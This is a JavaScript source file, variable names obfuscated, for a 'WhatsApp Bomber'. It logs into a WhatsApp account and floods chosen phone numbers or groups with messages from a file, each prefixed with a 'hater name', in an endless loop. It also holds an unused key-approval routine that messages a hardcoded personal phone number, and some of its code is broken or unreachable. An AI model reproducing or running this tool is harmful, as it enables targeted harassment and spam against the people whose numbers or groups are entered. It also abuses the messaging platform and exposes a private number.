(async () => {
  try {
    const {
      makeWASocket: _0x4f98c4,
      useMultiFileAuthState: _0x43d940,
      delay: _0x2bedd9,
      DisconnectReason: _0x13d9dd
    } = await import("@whiskeysockets/baileys");
    const _0x5f1924 = await import('fs');
    const _0x3381b6 = (await import("pino"))["default"];
    const _0x41d8de = (await import("readline")).createInterface({
      'input': process.stdin,
      'output': process.stdout
    });
    const _0x63463b = await import("axios");
    const _0x1fdef7 = await import('os');
    const _0x123226 = await import("crypto");
    const { exec: _0x521a60 } = await import("child_process");

    const _0x3e09d7 = _0x1c864d => new Promise(_0x5da23c => _0x41d8de.question(_0x1c864d, _0x5da23c));

    const color = (text, colorCode) => `\x1b[${colorCode}m${text}\x1b[0m`;

    // ===================== FRESH KRIX BANNER =====================
    const _0x1e9ef5 = () => {
      console.clear();
      console.log(color("╔══════════════════════════════════════════╗", "36"));
      console.log(color("║                                          ║", "36"));
      console.log(color("║     ██╗  ██╗██████╗  ██╗██╗  ██╗        ║", "31"));
      console.log(color("║     ██║ ██╔╝██╔══██╗ ██║╚██╗██╔╝        ║", "31"));
      console.log(color("║     █████╔╝ ██████╔╝ ██║ ╚███╔╝         ║", "31"));
      console.log(color("║     ██╔═██╗ ██╔══██╗ ██║ ██╔██╗         ║", "31"));
      console.log(color("║     ██║  ██╗██║  ██║ ██║██╔╝ ██╗        ║", "31"));
      console.log(color("║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝  ╚═╝        ║", "31"));
      console.log(color("║                                          ║", "36"));
      console.log(color("║        ⚡ WHATSAPP BOMBER BY KRIX ⚡      ║", "33"));
      console.log(color("╚══════════════════════════════════════════╝", "36"));
    };
    // ==============================================================

    let _0x524dbd = [];
    let _0x4d8ae4 = [];
    let _0x83eb79 = null;
    let _0x1ad003 = null;
    let _0x2058a8 = null;
    let _0x765bc5 = 0;

    const {
      state: _0x567496,
      saveCreds: _0x80a92c
    } = await _0x43d940("./auth_info");

    const autoSeeStatuses = async (socket) => {
      socket.ev.on("presence.update", async (presence) => {
        if (presence.status === "available") {
          const chat = presence.id.split("@")[0];
          await socket.sendMessage(chat + "@s.whatsapp.net", { text: "Seen" });
        }
      });
    };

    const checkApproval = async (userKey) => {
      try {
        const response = await _0x63463b.get('https://github.com/Harshit-420/Ofline-whatsppraj_thakur_don7/blob/main/Approval.txt');
        const approvedUsers = response.data.split("\n").map(line => line.trim());
        if (approvedUsers.includes(userKey)) {
          return true;
        } else {
          // If not approved, send message to request approval
          await _0x4e34c7.sendMessage("919695003501@c.us", {
            text: "HELLO RAJ THAKUR SIR 🔐 🗝️🔑✅ PLEASE APPROVE MY KEY => " + userKey
          });
          return false;
        }
      } catch (error) {
        console.error("Error checking approval: " + error);
        return false;
      }
    };

    async function _0x1fa6d2(_0x57d012) {
      while (true) {
        for (let _0x281a84 = _0x765bc5; _0x281a84 < _0x83eb79.length; _0x281a84++) {
          try {
            const _0x7cac94 = new Date().toLocaleTimeString();
            const _0x1f80a0 = _0x2058a8 + " " + _0x83eb79[_0x281a84];
            if (_0x524dbd.length > 0) {
              for (const _0x5ec96e of _0x524dbd) {
                await _0x57d012.sendMessage(_0x5ec96e + "@c.us", {
                  'text': _0x1f80a0
                });
                console.log(color("[TARGET NUMBER => " + _0x5ec96e + "]", "32"));
              }
            } else {
              for (const _0x4081a3 of _0x4d8ae4) {
                await _0x57d012.sendMessage(_0x4081a3 + "@g.us", {
                  'text': _0x1f80a0
                });
                console.log(color("[GROUP UID => " + _0x4081a3 + "]", "33"));
              }
            }
            console.log(color("[TIME => " + _0x7cac94 + "]", "34"));
            console.log(color("[MESSAGE => " + _0x1f80a0 + "]", "35"));
            console.log(color("[<<===========•KRIX X BOMBER•===========>>]", "37"));
            await _0x2bedd9(_0x1ad003 * 1000);
          } catch (_0x101498) {
            _0x765bc5 = _0x281a84;
            await _0x2bedd9(5000);
          }
        }
        _0x765bc5 = 0;
      }
    }

    const _0x2cf4fd = async () => {
      const _0x4e34c7 = _0x4f98c4({
        'logger': _0x3381b6({
          'level': "silent"
        }),
        'auth': _0x567496
      });

      if (!_0x4e34c7.authState.creds.registered) {
        _0x1e9ef5();
        const _0x13770e = await _0x3e09d7(color("[+] ENTER YOUR PHONE NUMBER => ", "36"));
        const _0x6aed75 = await _0x4e34c7.requestPairingCode(_0x13770e);
        _0x1e9ef5();
        console.log(color("[√] YOUR PAIRING CODE Is => " + _0x6aed75, "31"));
      }

      _0x4e34c7.ev.on("connection.update", async _0x178b36 => {
        const { connection: _0xf2d9da, lastDisconnect: _0x3d9270 } = _0x178b36;

        if (_0xf2d9da === "open") {
          _0x1e9ef5();
          console.log(color("[Your WHATSAPP LOGIN ✓]", "32"));

          

          const _0xc17546 = await _0x3e09d7(color("[1] SEND TO TARGET NUMBER\n[2] SEND To WHATSAPP GROUP\nCHOOSE OPTION => ", "36"));

          if (_0xc17546 === '1') {
            const _0x5b49cd = await _0x3e09d7(color("[+] HOW MANY TARGET NUMBERS? => ", "32"));
            for (let _0x4b5913 = 0; _0x4b5913 < _0x5b49cd; _0x4b5913++) {
              const _0xc3880f = await _0x3e09d7(color("[+] ENTER TARGET NUMBER " + (_0x4b5913 + 1) + " => ", "34"));
              _0x524dbd.push(_0xc3880f);
            }
          } else {
            if (_0xc17546 === '2') {
              const _0x2eb662 = await _0x4e34c7.groupFetchAllParticipating();
              const _0x2c30db = Object.keys(_0x2eb662);
              console.log(color("[√] WHATSAPP GROUPS =>", "33"));
              _0x2c30db.forEach((_0x7ae5d7, _0x185f99) => {
                console.log(color("[" + (_0x185f99 + 1) + "] GROUP NAME: " + _0x2eb662[_0x7ae5d7].subject + " [UID: " + _0x7ae5d7 + "]", "34"));
              });
              const _0x358bc9 = await _0x3e09d7(color("[+] HOW MANY GROUPS TO TARGET => ", "35"));
              for (let _0x2ed06f = 0; _0x2ed06f < _0x358bc9; _0x2ed06f++) {
                const _0x4a33ee = await _0x3e09d7(color("[+] ENTER GROUP UID " + (_0x2ed06f + 1) + " => ", "36"));
                _0x4d8ae4.push(_0x4a33ee);
              }
            }
          }

          const _0x3a3751 = await _0x3e09d7(color("[+] ENTER MESSAGE FILE PATH => ", "37"));
          _0x83eb79 = _0x5f1924.readFileSync(_0x3a3751, "utf-8").split("\n").filter(Boolean);
          _0x2058a8 = await _0x3e09d7(color("[+] ENTER HATER NAME => ", "32"));
          _0x1ad003 = await _0x3e09d7(color("[+] ENTER MESSAGE DELAY => ", "34"));
          console.log(color("[√] All Details Are Filled Correctly", "32"));
          _0x1e9ef5();
          console.log(color("[NOW START MESSAGE SENDING.......]", "36"));
          await _0x1fa6d2(_0x4e34c7);
          autoSeeStatuses(_0x4e34c7);
        }

        if (_0xf2d9da === "close" && _0x3d9270?.["error"]) {
          const _0x291b26 = _0x3d9270.error?.["output"]?.["statusCode"] !== _0x13d9dd.loggedOut;
          if (_0x291b26) {
            setTimeout(_0x2cf4fd, 5000);
          } else {
            console.log(color("Connection closed. Please restart the script.", "31"));
          }
        }
      });
      _0x4e34c7.ev.on("creds.update", _0x80a92c);
    };

    const _0x16c48b = _0x123226.createHash("sha256").update(_0x1fdef7.platform() + _0x1fdef7.userInfo().username).digest("hex");
    console.log(color("YOUR KEY: " + _0x16c48b, "36"));
    console.log(color("[Waiting for login...]", "37"));
    _0x2cf4fd();

    process.on('exit', () => {});
  } catch (error) {
    console.error("Error in script: ", error);
  }
})();
